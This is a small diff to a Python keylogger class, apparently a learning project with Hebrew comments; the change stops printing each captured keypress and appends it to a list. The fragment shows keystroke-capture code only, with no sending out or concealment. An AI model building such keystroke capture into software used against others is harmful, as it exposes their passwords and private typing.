@@ -27,9 +27,9 @@ class KeyLogger(IKeyLogger):
 
     def __on_press(self,Key):
         key_nise = KeyLogger.nurmal_key(Key)
-        print(key_nise)
+        # print(key_nise)
         # לתקן את הדרך
-        # FileWriter().write(key_nise)
+        self.arr.append(key_nise)
 
         # פןנקציה שמפסיקה את התוכנה אם לחץ על קונטרול שיפט d
     @staticmethod
